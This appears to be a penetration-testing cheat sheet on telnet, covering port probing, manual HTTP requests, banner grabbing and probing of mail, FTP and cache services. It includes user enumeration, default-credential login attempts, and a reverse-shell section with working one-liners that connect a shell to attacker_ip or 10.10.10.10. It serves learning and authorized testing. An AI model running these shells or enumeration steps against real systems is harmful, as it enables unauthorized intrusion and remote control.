# test network services with telnet because netcat isn't always installed. example: probe ports, send http requests, banner grab

## basic connections
```bash
telnet 192.168.1.1 80          # connect to port 80
telnet google.com 443          # connect to https port
nc -nv 192.168.1.1 80          # netcat alternative (if available)
```

## exit telnet session
```bash
# in session: ctrl+] then type quit
# or just ctrl+c to force exit
```

## common port testing
```bash
telnet target 21               # ftp
telnet target 22               # ssh (will show version)
telnet target 23               # telnet service
telnet target 25               # smtp
telnet target 53               # dns
telnet target 80               # http
telnet target 110              # pop3
telnet target 143              # imap
telnet target 443              # https
telnet target 993              # imaps
telnet target 995              # pop3s
telnet target 3306             # mysql
telnet target 5432             # postgresql
telnet target 8080             # http alternate
```

## http requests via telnet
```bash
# basic get request
telnet example.com 80
GET / HTTP/1.1
Host: example.com
Connection: close

# get specific page
GET /admin HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Connection: close

# post request
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

user=admin&pass=secret
```

## service banner grabbing
```bash
# grab service banners
telnet target 21               # ftp: "220 (vsFTPd 3.0.3)"  
telnet target 22               # ssh: "SSH-2.0-OpenSSH_7.4"
telnet target 25               # smtp: "220 mail.target.com ESMTP"
telnet target 3306             # mysql: "5.7.32-log MySQL"
```

## smtp enumeration
```bash
telnet target 25
EHLO attacker.com
VRFY root                      # verify user exists
EXPN admin                     # expand mailing list
RCPT TO: user@target.com       # check if user exists
```

## ftp interaction
```bash
telnet target 21
USER anonymous                 # try anonymous login
PASS anything
USER admin                     # try common usernames
PASS admin
LIST                          # list files
RETR filename.txt             # download file
```

## pop3/imap testing
```bash
# pop3
telnet target 110
USER admin
PASS password
LIST                          # list emails
RETR 1                        # retrieve email 1

# imap
telnet target 143
a1 LOGIN admin password
a2 LIST "" "*"                # list mailboxes
a3 SELECT INBOX               # select inbox
a4 FETCH 1 BODY[]             # fetch email body
```

## automated banner grabbing
```bash
# bash script for multiple ports
for port in 21 22 23 25 53 80 110 443 993 995 3306 5432 8080; do
    echo "Testing port $port"
    timeout 3 telnet target $port 2>/dev/null || echo "Port $port closed"
done

# one-liner port scan
echo "quit" | telnet target 80 2>/dev/null | head -5
```

## reverse shell via telnet
```bash
# linux reverse shell
telnet attacker_ip 4444 | /bin/bash | telnet attacker_ip 4445

# or use built-in reverse shell  
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | telnet attacker_ip 4444 1>/tmp/backpipe

# python reverse shell
python -c "import socket,subprocess,os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('10.10.10.10', 4444)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); subprocess.call(['/bin/sh', '-i'])"
```

## service-specific interactions
```bash
# mysql interaction
telnet target 3306
# look for version in response, might allow injection

# redis interaction  
telnet target 6379
INFO                          # get redis info
KEYS *                        # list all keys
GET keyname                   # get key value

# memcached interaction
telnet target 11211
stats                         # get statistics
get keyname                   # retrieve cached item
```

## scripted telnet usage
```bash
#!/bin/bash
# automated http request
{
    echo "GET / HTTP/1.1"
    echo "Host: $1"
    echo "Connection: close"
    echo ""
} | telnet $1 80

# save as http_check.sh, use: ./http_check.sh example.com
```

## telnet over proxy
```bash
# through tor (needs proxychains)
proxychains telnet target.onion 80

# through socks proxy
ssh -D 8080 user@proxy_server
# then configure app to use socks proxy at 127.0.0.1:8080
```

## (._.) gotchas
```bash
# telnet sends each keypress immediately
# use netcat instead for file transfers
# ssl/tls services will show garbled text
# modern services may drop connection immediately
# some services need specific protocols (http/1.1 vs http/1.0)
```

# TODO: add telnet protocol negotiation, telnet options, binary mode transfers